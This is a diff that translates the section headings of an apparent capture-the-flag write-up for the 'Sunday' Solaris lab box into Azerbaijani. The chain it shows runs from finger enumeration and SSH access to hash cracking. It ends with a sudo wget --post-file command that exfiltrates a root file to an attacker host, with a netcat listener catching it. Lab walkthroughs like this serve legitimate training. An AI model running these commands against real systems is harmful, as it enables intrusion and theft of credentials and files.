@@ -10,30 +10,30 @@
 ## Hücum Zənciri
 
 ```text
-Reconnaissance
+Kəşfiyyat
 ├── nmap -sC -sV -p- sunday.htb → 79 (Finger), 22022 (SSH OpenSSH 8.4)
 └── Platform: Solaris
 
-Enumeration (Finger)
+Sadalanma (Finger)
 ├── msfconsole → scanner/finger/finger_users
 └── ./finger-user-enum.pl -u root -t <target>
     └── Response: root ... <PASSWORD> (Office Location = password hint)
 
-Foothold (SSH)
+İlkin Giriş (SSH)
 ├── ssh -p 22022 sunny@sunday.htb → password: <PASSWORD>
 └── sudo -l → (root) NOPASSWD: /root/troll - TRAP
 
-Lateral Movement (Backup)
+Üfüqi Yerdəyişmə (Backup)
 ├── cd /backup → agent22.backup, shadow.backup
 ├── sammy:<SHA256_HASH>
 ├── sunny:<SHA256_HASH>
 └── hashcat -m 7400 → sammy:<PASSWORD>
 
-User Flag
+İstifadəçi Bayrağı
 ├── ssh -p 22022 sammy@sunday.htb (<PASSWORD>)
 └── cat user.txt → <USER_FLAG>
 
-Privilege Escalation (sudo wget)
+Səlahiyyətlərin Artırılması (sudo wget)
 ├── sudo -l → (root) NOPASSWD: /usr/bin/wget
 ├── Exfil: sudo wget --post-file=/root/root.txt http://10.10.14.160:8000/
 ├── nc -lvnp 8000 → root flag (<ROOT_FLAG>)
